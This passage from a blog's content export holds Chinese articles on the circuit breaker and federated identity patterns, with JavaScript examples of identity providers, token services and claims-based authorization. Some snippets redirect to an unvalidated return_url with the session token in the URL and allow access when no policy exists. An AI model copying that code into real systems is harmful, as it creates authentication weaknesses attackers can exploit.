主動（半開測試） 被動（重試成功） 💡 最佳實踐：結合兩種模式在斷路器內使用重試模式： 斷路器包裝操作 重試處理暫時性故障 斷路器防止過度重試 系統獲得兩種方法的優點 總結 斷路器模式對於建構彈性分散式系統至關重要： 防止連鎖故障透過停止對故障服務的呼叫 保護系統資源免於在中斷期間耗盡 實現優雅降級透過備援回應 提供快速失敗而非等待逾時 監控服務健康並自動偵測恢復 就像電路斷路器保護你的家一樣，這個模式保護你的分散式系統免受故障相依性造成的損害。它不是為了防止故障——而是為了優雅地失敗並快速恢復。 參考資料 Microsoft Azure Architecture Patterns - Circuit Breaker Martin Fowler - CircuitBreaker Release It! by Michael Nygard","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"联合身份识别：一次登录，畅行无阻","slug":"2019/12/Federated-Identity-Pattern-zh-CN","date":"un00fin00","updated":"un22fin22","comments":true,"path":"/zh-CN/2019/12/Federated-Identity-Pattern/","permalink":"https://neo01.com/zh-CN/2019/12/Federated-Identity-Pattern/","excerpt":"将身份验证委托给外部身份识别提供者，简化开发流程、降低管理负担，并改善跨多个应用程序和组织的用户体验。","text":"想象一下，你需要为每栋建筑物携带不同的钥匙——办公室、健身房、图书馆、公寓。现在想象你有一把万能钥匙可以通行所有地方，但每栋建筑物仍然控制谁可以进入。这就是联合身份识别的本质：一组凭证，在多个系统间受信任，而每个系统仍保有控制权限的能力。 挑战：太多密码，太多问题 在当今互联的世界中，用户需要使用来自多个组织的应用程序——他们的雇主、业务合作伙伴、云服务提供者和第三方工具。传统上，每个应用程序都需要自己的身份验证系统。 传统做法：到处都是独立凭证 &#x2F;&#x2F; 每个应用程序管理自己的用户 class TraditionalAuthSystem &#123; constructor() &#123; this.users &#x3D; new Map(); &#125; async register(username, password, email) &#123; &#x2F;&#x2F; 将凭证存储在应用程序数据库中 const hashedPassword &#x3D; await this.hashPassword(password); this.users.set(username, &#123; password: hashedPassword, email: email, createdAt: new Date() &#125;); &#125; async login(username, password) &#123; const user &#x3D; this.users.get(username); if (!user) &#123; throw new Error(&#39;找不到用户&#39;); &#125; const isValid &#x3D; await this.verifyPassword(password, user.password); if (!isValid) &#123; throw new Error(&#39;密码无效&#39;); &#125; return this.createSession(username); &#125; &#125; ⚠️ 传统身份验证的问题用户体验不连贯：管理多个账号时，用户容易忘记凭证 安全漏洞：离职员工的账号可能无法及时停用 管理负担：需要跨系统管理用户、密码和权限 开发负担：构建和维护身份验证基础设施 解决方案：联合身份识别 将身份验证委托给受信任的外部身份识别提供者。用户只需在身份识别提供者进行一次验证，即可访问多个应用程序，无需重新输入凭证。 graph LR User([用户]) -->|1. 访问应用程序| App[应用程序] App -->|2. 重定向至 IdP| IdP[身份识别提供者] User -->|3. 验证| IdP IdP -->|4. 发行令牌| STS[安全令牌服务] STS -->|5. 返回包含声明的令牌| App App -->|6. 授予访问权| User style User fill:#4dabf7,stroke:#1971c2 style App fill:#51cf66,stroke:#2f9e44 style IdP fill:#ffd43b,stroke:#f59f00 style STS fill:#ff8787,stroke:#c92a2a 运作方式 用户尝试访问应用程序：应用程序检测到用户未经验证 重定向至身份识别提供者：应用程序将用户重定向至受信任的身份识别提供者 用户验证：用户向身份识别提供者提供凭证 发行令牌：身份识别提供者发行包含用户声明的安全令牌 令牌验证：应用程序验证令牌并提取用户信息 授予访问权：用户无需创建新凭证即可访问应用程序 核心组件 1. 身份识别提供者 (IdP) 验证用户并发行令牌的受信任机构： class IdentityProvider &#123; constructor(userDirectory) &#123; this.userDirectory &#x3D; userDirectory; this.trustedApplications &#x3D; new Set(); &#125; async authenticate(username, password, applicationId) &#123; &#x2F;&#x2F; 验证应用程序是否受信任 if (!this.trustedApplications.has(applicationId)) &#123; throw new Error(&#39;不受信任的应用程序&#39;); &#125; &#x2F;&#x2F; 对目录验证用户 const user &#x3D; await this.userDirectory.validateCredentials( username, password ); if (!user) &#123; throw new Error(&#39;验证失败&#39;); &#125; &#x2F;&#x2F; 发行包含声明的令牌 return this.issueToken(user, applicationId); &#125; issueToken(user, applicationId) &#123; const claims &#x3D; &#123; userId: user.id, username: user.username, email: user.email, roles: user.roles, department: user.department, issuer: &#39;corporate-idp&#39;, audience: applicationId, issuedAt: Date.now(), expiresAt: Date.now() + (3600 * 1000) &#x2F;&#x2F; 1 小时 &#125;; &#x2F;&#x2F; 签署令牌 return this.signToken(claims); &#125; &#125; 2. 安全令牌服务 (STS) 转换和增强令牌，在身份识别提供者和应用程序之间建立信任： class SecurityTokenService &#123; constructor(trustedIdPs) &#123; this.trustedIdPs &#x3D; trustedIdPs; this.claimMappings &#x3D; new Map(); &#125; async transformToken(incomingToken, targetApplication) &#123; &#x2F;&#x2F; 验证令牌来自受信任的 IdP const tokenInfo &#x3D; await this.validateToken(incomingToken); if (!this.trustedIdPs.has(tokenInfo.issuer)) &#123; throw new Error(&#39;来自不受信任发行者的令牌&#39;); &#125; &#x2F;&#x2F; 为目标应用程序转换声明 const transformedClaims &#x3D; this.transformClaims( tokenInfo.claims, targetApplication ); &#x2F;&#x2F; 为目标应用程序发行新令牌 return this.issueToken(transformedClaims, targetApplication); &#125; transformClaims(claims, targetApplication) &#123; const mapping &#x3D; this.claimMappings.get(targetApplication); if (!mapping) &#123; return claims; &#x2F;&#x2F; 不需要转换 &#125; const transformed &#x3D; &#123;&#125;; for (const [sourceClaim, targetClaim] of mapping.entries()) &#123; if (claims[sourceClaim]) &#123; transformed[targetClaim] &#x3D; claims[sourceClaim]; &#125; &#125; &#x2F;&#x2F; 添加应用程序特定的声明 transformed.applicationId &#x3D; targetApplication; transformed.transformedAt &#x3D; Date.now(); return transformed; &#125; &#125; 3. 基于声明的访问控制 应用程序根据令牌中的声明授权访问： class ClaimsBasedAuthorization &#123; constructor() &#123; this.policies &#x3D; new Map(); &#125; definePolicy(resource, requiredClaims) &#123; this.policies.set(resource, requiredClaims); &#125; async authorize(token, resource) &#123; &#x2F;&#x2F; 从令牌提取声明 const claims &#x3D; await this.extractClaims(token); &#x2F;&#x2F; 获取资源所需的声明 const required &#x3D; this.policies.get(resource); if (!required) &#123; return true; &#x2F;&#x2F; 未定义策略，允许访问 &#125; &#x2F;&#x2F; 检查用户是否具有所需的声明 return this.evaluateClaims(claims, required); &#125; evaluateClaims(userClaims, requiredClaims) &#123; for (const [claimType, requiredValue] of Object.entries(requiredClaims)) &#123; const userValue &#x3D; userClaims[claimType]; if (!userValue) &#123; return false; &#x2F;&#x2F; 缺少必要的声明 &#125; if (Array.isArray(requiredValue)) &#123; &#x2F;&#x2F; 检查用户是否具有任何所需的值 if (!requiredValue.includes(userValue)) &#123; return false; &#125; &#125; else if (userValue !&#x3D;&#x3D; requiredValue) &#123; return false; &#125; &#125; return true; &#125; &#125; &#x2F;&#x2F; 使用示例 const authz &#x3D; new ClaimsBasedAuthorization(); &#x2F;&#x2F; 定义访问策略 authz.definePolicy(&#39;&#x2F;admin&#39;, &#123; role: [&#39;admin&#39;, &#39;superuser&#39;] &#125;); authz.definePolicy(&#39;&#x2F;reports&#x2F;financial&#39;, &#123; role: &#39;manager&#39;, department: &#39;finance&#39; &#125;); &#x2F;&#x2F; 检查授权 const canAccess &#x3D; await authz.authorize(userToken, &#39;&#x2F;admin&#39;); 实现示例 完整的联合身份验证流程： class FederatedApplication &#123; constructor(identityProviderUrl, applicationId, secretKey) &#123; this.identityProviderUrl &#x3D; identityProviderUrl; this.applicationId &#x3D; applicationId; this.secretKey &#x3D; secretKey; this.authorization &#x3D; new ClaimsBasedAuthorization(); &#125; &#x2F;&#x2F; 保护路由的中间件 requireAuthentication() &#123; return async (req, res, next) &#x3D;&gt; &#123; const token &#x3D; req.headers.authorization?.replace(&#39;Bearer &#39;, &#39;&#39;); if (!token) &#123; &#x2F;&#x2F; 重定向至身份识别提供者 const redirectUrl &#x3D; this.buildAuthenticationUrl(req.originalUrl); return res.redirect(redirectUrl); &#125; try &#123; &#x2F;&#x2F; 验证令牌 const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; 将用户信息附加到请求 req.user &#x3D; claims; next(); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;无效的令牌&#39; &#125;); &#125; &#125;; &#125; buildAuthenticationUrl(returnUrl) &#123; const params &#x3D; new URLSearchParams(&#123; client_id: this.applicationId, return_url: returnUrl, response_type: &#39;token&#39; &#125;); return &#96;$&#123;this.identityProviderUrl&#125;&#x2F;authenticate?$&#123;params&#125;&#96;; &#125; async handleCallback(req, res) &#123; const &#123; token &#125; &#x3D; req.query; try &#123; &#x2F;&#x2F; 验证来自 IdP 的令牌 const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; 创建应用程序会话 const sessionToken &#x3D; await this.createSession(claims); &#x2F;&#x2F; 重定向至原始目的地 const returnUrl &#x3D; req.query.return_url || &#39;&#x2F;&#39;; res.redirect(&#96;$&#123;returnUrl&#125;?token&#x3D;$&#123;sessionToken&#125;&#96;); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;验证失败&#39; &#125;); &#125; &#125; async validateToken(token) &#123; &#x2F;&#x2F; 验证令牌签名 const payload &#x3D; await this.verifySignature(token, this.secretKey); &#x2F;&#x2F; 检查过期时间 if (payload.expiresAt &lt; Date.now()) &#123; throw new Error(&#39;令牌已过期&#39;); &#125; &#x2F;&#x2F; 验证对象 if (payload.audience !&#x3D;&#x3D; this.applicationId) &#123; throw new Error(&#39;令牌不适用于此应用程序&#39;); &#125; return payload; &#125; &#125; &#x2F;&#x2F; 设置应用程序 const app &#x3D; express(); const federatedApp &#x3D; new FederatedApplication( &#39;https:&#x2F;&#x2F;idp.company.com&#39;, &#39;my-application-id&#39;, process.env.SECRET_KEY ); &#x2F;&#x2F; IdP 的回调端点 app.get(&#39;&#x2F;auth&#x2F;callback&#39;, (req, res) &#x3D;&gt; &#123; federatedApp.handleCallback(req, res); &#125;); &#x2F;&#x2F; 受保护的路由 app.get(&#39;&#x2F;dashboard&#39;, federatedApp.requireAuthentication(), (req, res) &#x3D;&gt; &#123; res.json(&#123; message: &#39;欢迎来到仪表板&#39;, user: req.user &#125;); &#125; ); 主领域发现 当有多个身份识别提供者可用时，系统必须决定使用哪一个： class HomeRealmDiscovery &#123; constructor() &#123; this.providerMappings &#x3D; new Map(); this.defaultProvider &#x3D; null; &#125; registerProvider(identifier, providerUrl) &#123; this.providerMappings.set(identifier, providerUrl); &#125; setDefaultProvider(providerUrl) &#123; this.defaultProvider &#x3D; providerUrl; &#125; discoverProvider(userIdentifier) &#123; &#x2F;&#x2F; 从电子邮件提取域名 if (userIdentifier.includes(&#39;@&#39;)) &#123; const domain &#x3D; userIdentifier.split(&#39;@&#39;)[1]; &#x2F;&#x2F; 检查域名是否有对应的提供者 if (this.providerMappings.has(domain)) &#123; return this.providerMappings.get(domain); &#125; &#125; &#x2F;&#x2F; 检查基于子域名的发现 const subdomain &#x3D; this.extractSubdomain(userIdentifier); if (subdomain &amp;&amp; this.providerMappings.has(subdomain)) &#123; return this.providerMappings.get(subdomain); &#125; &#x2F;&#x2F; 返回默认提供者 return this.defaultProvider; &#125; async promptUserSelection(availableProviders) &#123; &#x2F;&#x2F; 向用户呈现身份识别提供者列表 return &#123; providers: Array.from(this.providerMappings.entries()).map( ([name, url]) &#x3D;&gt; (&#123; name, url &#125;) ) &#125;; &#125; &#125; &#x2F;&#x2F; 使用方式 const discovery &#x3D; new HomeRealmDiscovery(); &#x2F;&#x2F; 将域名映射到身份识别提供者 discovery.registerProvider(&#39;company.com&#39;, &#39;https:&#x2F;&#x2F;idp.company.com&#39;); discovery.registerProvider(&#39;partner.com&#39;, &#39;https:&#x2F;&#x2F;sso.partner.com&#39;); discovery.registerProvider(&#39;social&#39;, &#39;https:&#x2F;&#x2F;social-idp.com&#39;); &#x2F;&#x2F; 为用户发现提供者 const provider &#x3D; discovery.discoverProvider(&#39;user@company.com&#39;); &#x2F;&#x2F; 返回：https:&#x2F;&#x2F;idp.company.com 联合身份识别的优势 1. 单点登录 (SSO) 用户验证一次即可访问多个应用程序： sequenceDiagram participant User as 用户 participant App1 as 应用程序 1 participant App2 as 应用程序 2 participant IdP as 身份识别提供者 User->>App1: 访问应用程序 1 App1->>IdP: 重定向进行验证 User->>IdP: 提供凭证 IdP->>App1: 返回令牌 App1->>User: 授予访问权 Note over User,App2: 稍后，用户访问应用程序 2 User->>App2: 访问应用程序 2 App2->>IdP: 检查验证 IdP->>App2: 返回现有令牌 App2->>User: 授予访问权（无需登录） 2. 集中式身份管理 身份识别提供者管理所有用户账号： class CentralizedIdentityManagement &#123; async onboardEmployee(employee) &#123; &#x2F;&#x2F; 在身份识别提供者中创建账号 await this.identityProvider.createUser(&#123; username: employee.email, name: employee.name, department: employee.department, roles: employee.roles &#125;); &#x2F;&#x2F; 员工自动拥有所有应用程序的访问权 &#x2F;&#x2F; 无需在每个应用程序中创建账号 &#125; async offboardEmployee(employeeId) &#123; &#x2F;&#x2F; 在身份识别提供者中停用账号 await this.identityProvider.disableUser(employeeId); &#x2F;&#x2F; 员工立即失去所有应用程序的访问权 &#x2F;&#x2F; 无需在每个应用程序中停用账号 &#125; async updateEmployeeRole(employeeId, newRole) &#123; &#x2F;&#x2F; 在身份识别提供者中更新角色 await this.identityProvider.updateUser(employeeId, &#123; roles: [newRole] &#125;); &#x2F;&#x2F; 角色变更传播到所有应用程序 &#125; &#125; 3. 降低开发负担 应用程序无需实现身份验证： &#x2F;&#x2F; 之前：复杂的身份验证逻辑 class ApplicationWithAuth &#123; async register(user) &#123; &#x2F;* ... *&#x2F; &#125; async login(credentials) &#123; &#x2F;* ... *&#x2F; &#125; async resetPassword(email) &#123; &#x2F;* ... *&#x2F; &#125; async verifyEmail(token) &#123; &#x2F;* ... *&#x2F; &#125; async enable2FA(userId) &#123; &#x2F;* ... *&#x2F; &#125; &#x2F;&#x2F; ... 数百行验证代码 &#125; &#x2F;&#x2F; 之后：委托给身份识别提供者 class ApplicationWithFederation &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async authenticate(token) &#123; &#x2F;&#x2F; 只需验证令牌 return await this.identityProvider.validateToken(token); &#125; &#125; 设计考量 1. 单点故障 身份识别提供者的可用性至关重要： 🔒 可靠性考量跨多个数据中心部署：确保身份识别提供者具有高可用性 实现缓存：缓存令牌和验证结果以处理临时性中断 优雅降级：当 IdP 无法使用时允许有限的功能 监控健康状态：持续监控身份识别提供者的可用性 class ResilientTokenValidation &#123; constructor(identityProvider, cache) &#123; this.identityProvider &#x3D; identityProvider; this.cache &#x3D; cache; &#125; async validateToken(token) &#123; &#x2F;&#x2F; 先检查缓存 const cached &#x3D; await this.cache.get(&#96;token:$&#123;token&#125;&#96;); if (cached) &#123; return cached; &#125; try &#123; &#x2F;&#x2F; 使用身份识别提供者验证 const claims &#x3D; await this.identityProvider.validate(token); &#x2F;&#x2F; 缓存成功的验证 await this.cache.set(&#96;token:$&#123;token&#125;&#96;, claims, 300); &#x2F;&#x2F; 5 分钟 return claims; &#125; catch (error) &#123; &#x2F;&#x2F; 如果 IdP 无法使用，检查是否有缓存的验证 const fallback &#x3D; await this.cache.get(&#96;token:fallback:$&#123;token&#125;&#96;); if (fallback) &#123; console.warn(&#39;由于 IdP 无法使用，使用缓存的令牌验证&#39;); return fallback; &#125; throw error; &#125; &#125; &#125; 2. 社交身份识别提供者 社交提供者提供的用户信息有限： class SocialIdentityIntegration &#123; async handleSocialLogin(socialToken, provider) &#123; &#x2F;&#x2F; 从社交提供者提取声明 const socialClaims &#x3D; await this.validateSocialToken(socialToken, provider); &#x2F;&#x2F; 社交提供者通常只提供： &#x2F;&#x2F; - 唯一标识符 &#x2F;&#x2F; - 电子邮件（有时） &#x2F;&#x2F; - 名称（有时） &#x2F;&#x2F; 检查用户是否存在于应用程序中 let user &#x3D; await this.findUserBySocialId( provider, socialClaims.id ); if (!user) &#123; &#x2F;&#x2F; 首次登录 - 需要注册 user &#x3D; await this.registerSocialUser(&#123; socialProvider: provider, socialId: socialClaims.id, email: socialClaims.email, name: socialClaims.name &#125;); &#125; &#x2F;&#x2F; 使用应用程序特定的信息增强声明 return &#123; ...socialClaims, userId: user.id, roles: user.roles, preferences: user.preferences &#125;; &#125; &#125; 3. 令牌生命周期和更新 管理令牌过期和更新： class TokenLifecycleManager &#123; constructor(identityProvider) &#123; this.identityProvider &#x3D; identityProvider; &#125; async issueTokenPair(user) &#123; &#x2F;&#x2F; 短期访问令牌 const accessToken &#x3D; await this.createToken(user, &#123; type: &#39;access&#39;, expiresIn: 900 &#x2F;&#x2F; 15 分钟 &#125;); &#x2F;&#x2F; 长期刷新令牌 const refreshToken &#x3D; await this.createToken(user, &#123; type: &#39;refresh&#39;, expiresIn: 2592000 &#x2F;&#x2F; 30 天 &#125;); return &#123; accessToken, refreshToken &#125;; &#125; async refreshAccessToken(refreshToken) &#123; &#x2F;&#x2F; 验证刷新令牌 const claims &#x3D; await this.validateToken(refreshToken); if (claims.type !&#x3D;&#x3D; &#39;refresh&#39;) &#123; throw new Error(&#39;无效的令牌类型&#39;); &#125; &#x2F;&#x2F; 发行新的访问令牌 return await this.createToken(claims, &#123; type: &#39;access&#39;, expiresIn: 900 &#125;); &#125; &#125; 何时使用此模式 ✅ 理想场景企业单点登录：员工访问多个企业应用程序 多合作伙伴协作：业务合作伙伴需要访问但没有企业账号 SaaS 应用程序：多租户应用程序，每个租户使用自己的身份识别提供者 消费者应用程序：允许用户使用社交身份识别提供者登录 ❌ 不适用的情况单一身份识别提供者：所有用户使用应用程序可访问的一个系统进行验证 旧系统：应用程序无法处理现代身份验证协议 高度隔离的系统：安全要求禁止外部身份验证 实际示例：多租户 SaaS class MultiTenantSaaS &#123; constructor() &#123; this.tenants &#x3D; new Map(); this.sts &#x3D; new SecurityTokenService(); &#125; async registerTenant(tenantId, identityProviderConfig) &#123; &#x2F;&#x2F; 注册租户的身份识别提供者 this.tenants.set(tenantId, &#123; id: tenantId, identityProvider: identityProviderConfig, users: new Set() &#125;); &#x2F;&#x2F; 配置 STS 信任租户的 IdP await this.sts.addTrustedProvider( identityProviderConfig.issuer, identityProviderConfig.publicKey ); &#125; async authenticateUser(token) &#123; &#x2F;&#x2F; 使用 STS 验证令牌 const claims &#x3D; await this.sts.validateToken(token); &#x2F;&#x2F; 从令牌确定租户 const tenantId &#x3D; claims.tenantId; const tenant &#x3D; this.tenants.get(tenantId); if (!tenant) &#123; throw new Error(&#39;未知的租户&#39;); &#125; &#x2F;&#x2F; 验证用户属于租户 if (!tenant.users.has(claims.userId)) &#123; &#x2F;&#x2F; 首次用户 - 添加到租户 tenant.users.add(claims.userId); &#125; return &#123; user: claims, tenant: tenant &#125;; &#125; &#125; 总结 联合身份识别将身份验证从负担转变为助力。通过将身份验证委托给受信任的身份识别提供者，您可以： 改善用户体验，提供单点登录 增强安全性，实现集中式身份管理 降低开发工作量，避免自定义身份验证 促进协作，跨越组织界限 此模式在企业和多租户场景中特别强大，用户需要无缝访问多个应用程序，同时保持安全性和控制。 参考资料 联合身份识别模式 - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"聯合身分識別：一次登入，暢行無阻","slug":"2019/12/Federated-Identity-Pattern-zh-TW","date":"un00fin00","updated":"un22fin22","comments":true,"path":"/zh-TW/2019/12/Federated-Identity-Pattern/","permalink":"https://neo01.com/zh-TW/2019/12/Federated-Identity-Pattern/","excerpt":"將身分驗證委託給外部身分識別提供者，簡化開發流程、降低管理負擔，並改善跨多個應用程式和組織的使用者體驗。","text":"想像一下，你需要為每棟建築物攜帶不同的鑰匙——辦公室、健身房、圖書館、公寓。現在想像你有一把萬能鑰匙可以通行所有地方，但每棟建築物仍然控制誰可以進入。這就是聯合身分識別的本質：一組憑證，在多個系統間受信任，而每個系統仍保有控制權限的能力。 挑戰：太多密碼，太多問題 在當今互聯的世界中，使用者需要使用來自多個組織的應用程式——他們的雇主、業務合作夥伴、雲端服務提供者和第三方工具。傳統上，每個應用程式都需要自己的身分驗證系統。 傳統做法：到處都是獨立憑證 &#x2F;&#x2F; 每個應用程式管理自己的使用者 class TraditionalAuthSystem &#123; constructor() &#123; this.users &#x3D; new Map(); &#125; async register(username, password, email) &#123; &#x2F;&#x2F; 將憑證儲存在應用程式資料庫中 const hashedPassword &#x3D; await this.hashPassword(password); this.users.set(username, &#123; password: hashedPassword, email: email, createdAt: new Date() &#125;); &#125; async login(username, password) &#123; const user &#x3D; this.users.get(username); if (!user) &#123; throw new Error(&#39;找不到使用者&#39;); &#125; const isValid &#x3D; await this.verifyPassword(password, user.password); if (!isValid) &#123; throw new Error(&#39;密碼無效&#39;); &#125; return this.createSession(username); &#125; &#125; ⚠️ 傳統身分驗證的問題使用者體驗不連貫：管理多個帳號時，使用者容易忘記憑證 安全漏洞：離職員工的帳號可能無法及時停用 管理負擔：需要跨系統管理使用者、密碼和權限 開發負擔：建置和維護身分驗證基礎設施 解決方案：聯合身分識別 將身分驗證委託給受信任的外部身分識別提供者。使用者只需在身分識別提供者進行一次驗證，即可存取多個應用程式，無需重新輸入憑證。 graph LR User([使用者]) -->|1. 存取應用程式| App[應用程式] App -->|2. 重新導向至 IdP| IdP[身分識別提供者] User -->|3. 驗證| IdP IdP -->|4. 發行權杖| STS[安全權杖服務] STS -->|5. 回傳包含宣告的權杖| App App -->|6. 授予存取權| User style User fill:#4dabf7,stroke:#1971c2 style App fill:#51cf66,stroke:#2f9e44 style IdP fill:#ffd43b,stroke:#f59f00 style STS fill:#ff8787,stroke:#c92a2a 運作方式 使用者嘗試存取應用程式：應用程式偵測到使用者未經驗證 重新導向至身分識別提供者：應用程式將使用者重新導向至受信任的身分識別提供者 使用者驗證：使用者向身分識別提供者提供憑證 發行權杖：身分識別提供者發行包含使用者宣告的安全權杖 權杖驗證：應用程式驗證權杖並提取使用者資訊 授予存取權：使用者無需建立新憑證即可存取應用程式 核心元件 1. 身分識別提供者 (IdP) 驗證使用者並發行權杖的受信任機構： class IdentityProvider &#123; constructor(userDirectory) &#123; this.userDirectory &#x3D; userDirectory; this.trustedApplications &#x3D; new Set(); &#125; async authenticate(username, password, applicationId) &#123; &#x2F;&#x2F; 驗證應用程式是否受信任 if (!this.trustedApplications.has(applicationId)) &#123; throw new Error(&#39;不受信任的應用程式&#39;); &#125; &#x2F;&#x2F; 對目錄驗證使用者 const user &#x3D; await this.userDirectory.validateCredentials( username, password ); if (!user) &#123; throw new Error(&#39;驗證失敗&#39;); &#125; &#x2F;&#x2F; 發行包含宣告的權杖 return this.issueToken(user, applicationId); &#125; issueToken(user, applicationId) &#123; const claims &#x3D; &#123; userId: user.id, username: user.username, email: user.email, roles: user.roles, department: user.department, issuer: &#39;corporate-idp&#39;, audience: applicationId, issuedAt: Date.now(), expiresAt: Date.now() + (3600 * 1000) &#x2F;&#x2F; 1 小時 &#125;; &#x2F;&#x2F; 簽署權杖 return this.signToken(claims); &#125; &#125; 2. 安全權杖服務 (STS) 轉換和增強權杖，在身分識別提供者和應用程式之間建立信任： class SecurityTokenService &#123; constructor(trustedIdPs) &#123; this.trustedIdPs &#x3D; trustedIdPs; this.claimMappings &#x3D; new Map(); &#125; async transformToken(incomingToken, targetApplication) &#123; &#x2F;&#x2F; 驗證權杖來自受信任的 IdP const tokenInfo &#x3D; await this.validateToken(incomingToken); if (!this.trustedIdPs.has(tokenInfo.issuer)) &#123; throw new Error(&#39;來自不受信任發行者的權杖&#39;); &#125; &#x2F;&#x2F; 為目標應用程式轉換宣告 const transformedClaims &#x3D; this.transformClaims( tokenInfo.claims, targetApplication ); &#x2F;&#x2F; 為目標應用程式發行新權杖 return this.issueToken(transformedClaims, targetApplication); &#125; transformClaims(claims, targetApplication) &#123; const mapping &#x3D; this.claimMappings.get(targetApplication); if (!mapping) &#123; return claims; &#x2F;&#x2F; 不需要轉換 &#125; const transformed &#x3D; &#123;&#125;; for (const [sourceClaim, targetClaim] of mapping.entries()) &#123; if (claims[sourceClaim]) &#123; transformed[targetClaim] &#x3D; claims[sourceClaim]; &#125; &#125; &#x2F;&#x2F; 新增應用程式特定的宣告 transformed.applicationId &#x3D; targetApplication; transformed.transformedAt &#x3D; Date.now(); return transformed; &#125; &#125; 3. 基於宣告的存取控制 應用程式根據權杖中的宣告授權存取： class ClaimsBasedAuthorization &#123; constructor() &#123; this.policies &#x3D; new Map(); &#125; definePolicy(resource, requiredClaims) &#123; this.policies.set(resource, requiredClaims); &#125; async authorize(token, resource) &#123; &#x2F;&#x2F; 從權杖提取宣告 const claims &#x3D; await this.extractClaims(token); &#x2F;&#x2F; 取得資源所需的宣告 const required &#x3D; this.policies.get(resource); if (!required) &#123; return true; &#x2F;&#x2F; 未定義政策，允許存取 &#125; &#x2F;&#x2F; 檢查使用者是否具有所需的宣告 return this.evaluateClaims(claims, required); &#125; evaluateClaims(userClaims, requiredClaims) &#123; for (const [claimType, requiredValue] of Object.entries(requiredClaims)) &#123; const userValue &#x3D; userClaims[claimType]; if (!userValue) &#123; return false; &#x2F;&#x2F; 缺少必要的宣告 &#125; if (Array.isArray(requiredValue)) &#123; &#x2F;&#x2F; 檢查使用者是否具有任何所需的值 if (!requiredValue.includes(userValue)) &#123; return false; &#125; &#125; else if (userValue !&#x3D;&#x3D; requiredValue) &#123; return false; &#125; &#125; return true; &#125; &#125; &#x2F;&#x2F; 使用範例 const authz &#x3D; new ClaimsBasedAuthorization(); &#x2F;&#x2F; 定義存取政策 authz.definePolicy(&#39;&#x2F;admin&#39;, &#123; role: [&#39;admin&#39;, &#39;superuser&#39;] &#125;); authz.definePolicy(&#39;&#x2F;reports&#x2F;financial&#39;, &#123; role: &#39;manager&#39;, department: &#39;finance&#39; &#125;); &#x2F;&#x2F; 檢查授權 const canAccess &#x3D; await authz.authorize(userToken, &#39;&#x2F;admin&#39;); 實作範例 完整的聯合身分驗證流程： class FederatedApplication &#123; constructor(identityProviderUrl, applicationId, secretKey) &#123; this.identityProviderUrl &#x3D; identityProviderUrl; this.applicationId &#x3D; applicationId; this.secretKey &#x3D; secretKey; this.authorization &#x3D; new ClaimsBasedAuthorization(); &#125; &#x2F;&#x2F; 保護路由的中介軟體 requireAuthentication() &#123; return async (req, res, next) &#x3D;&gt; &#123; const token &#x3D; req.headers.authorization?.replace(&#39;Bearer &#39;, &#39;&#39;); if (!token) &#123; &#x2F;&#x2F; 重新導向至身分識別提供者 const redirectUrl &#x3D; this.buildAuthenticationUrl(req.originalUrl); return res.redirect(redirectUrl); &#125; try &#123; &#x2F;&#x2F; 驗證權杖 const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; 將使用者資訊附加到請求 req.user &#x3D; claims; next(); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;無效的權杖&#39; &#125;); &#125; &#125;; &#125; buildAuthenticationUrl(returnUrl) &#123; const params &#x3D; new URLSearchParams(&#123; client_id: this.applicationId, return_url: returnUrl, response_type: &#39;token&#39; &#125;); return &#96;$&#123;this.identityProviderUrl&#125;&#x2F;authenticate?$&#123;params&#125;&#96;; &#125; async handleCallback(req, res) &#123; const &#123; token &#125; &#x3D; req.query; try &#123; &#x2F;&#x2F; 驗證來自 IdP 的權杖 const claims &#x3D; await this.validateToken(token); &#x2F;&#x2F; 建立應用程式工作階段 const sessionToken &#x3D; await this.createSession(claims); &#x2F;&#x2F; 重新導向至原始目的地 const returnUrl &#x3D; req.query.return_url || &#39;&#x2F;&#39;; res.redirect(&#96;$&#123;returnUrl&#125;?token&#x3D;$&#123;sessionToken&#125;&#96;); &#125; catch (error) &#123; res.status(401).json(&#123; error: &#39;驗證失敗&#39; &#125;); &#125; &#125; async validateToken(token) &#123; &#x2F;&#x2F; 驗證權杖簽章 const payload &#x3D; await this.verifySignature(token, this.secretKey); &#x2F;&#x2F; 檢查過期時間 if (payload.expiresAt &lt; Date.now()) &#123; throw new Error(&#39;權杖已過期&#39;); &#125; &#x2F;&#x2F; 驗證對象 if (payload.audience !&#x3D;&#x3D; this.applicationId) &#123; throw new Error(&#39;權杖不適用於此應用程式&#39;); &#125; return payload; &#125; &#125; &#x2F;&#x2F; 設定應用程式 const app &#x3D; express(); const federatedApp &#x3D; new FederatedApplication( &#39;https:&#x2F;&#x2F;idp.company.com&#39;, &#39;my-application-id&#39;, process.env.SECRET_KEY ); &#x2F;&#x2F; IdP 的回呼端點 app.get(&#39;&#x2F;auth&#x2F;callback&#39;, (req, res) &#x3D;&gt; &#123; federatedApp.handleCallback(req, res); &#125;); &#x2F;&#x2F; 受保護的路由 app.get(&#39;&#x2F;dashboard&#39;, federatedApp.requireAuthentication(), (req, res) &#x3D;&gt; &#123; res.json(&#123; message: &#39;歡迎來到儀表板&#39;, user: req.user &#125;); &#125; ); 主領域探索 當有多個身分識別提供者可用時，系統必須決定使用哪一個： class HomeRealmDiscovery &#123; constructor() &#123; this.providerMappings &#x3D; new Map(); this.defaultProvider &#x3D; null; &#125; registerProvider(identifier, providerUrl) &#123; this.providerMappings.set(identifier, providerUrl); &#125; setDefaultProvider(providerUrl) &#123; this.defaultProvider &#x3D; providerUrl; &#125; discoverProvider(userIdentifier) &#123; &#x2F;&#x2F; 從電子郵件提取網域 if (userIdentifier.includes(&#39;@&#39;)) &#123; const domain &#x3D; userIdentifier.split(&#39;@&#39;)[1]; &#x2F;&#x2F; 檢查網域是否有對應的提供者 if (this.providerMappings.has(domain)) &#123; return this.providerMappings.get(domain); &#125; &#125; &#x2F;&#x2F; 檢查基於子網域的探索 const subdomain &#x3D; this.extractSubdomain(userIdentifier); if (subdomain &amp;&amp; this.providerMappings.has(subdomain)) &#123; return 